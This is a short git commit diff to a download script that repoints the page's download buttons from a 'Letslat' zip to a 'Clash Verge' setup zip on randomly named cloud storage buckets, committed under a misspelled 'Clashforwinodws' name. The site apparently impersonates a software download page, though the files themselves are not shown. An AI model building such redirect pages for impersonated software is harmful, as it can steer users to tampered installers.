4fafd7440d5f44f84b0459239399de1decf9601f
Clashforwinodws <camilledotolo@gmail.com>
2026-06-26 10:39:37 +0800

    download2.js

--- download2.js
+++ download2.js
@@ -3,8 +3,8 @@ downClass.forEach(item => {
 	item.addEventListener('click', (e) => {
 		e.preventDefault();
 		const a = document.createElement("a");
-		a.href = "https://yangyangoss8.oss-cn-hongkong.aliyuncs.com/Letslat2.5.zip"; // 文件地址
-		a.download = "Letslat2.5.zip"; // 下载后的文件名
+		a.href = "https://iccoauvvv.oss-cn-hongkong.aliyuncs.com/Clash.Verge_2.5.1_x64-setup.zip"; // 文件地址
+		a.download = "Clash.Verge_2.5.1_x64-setup.zip"; // 下载后的文件名
 		document.body.appendChild(a);
 		a.click();
 		document.body.removeChild(a);
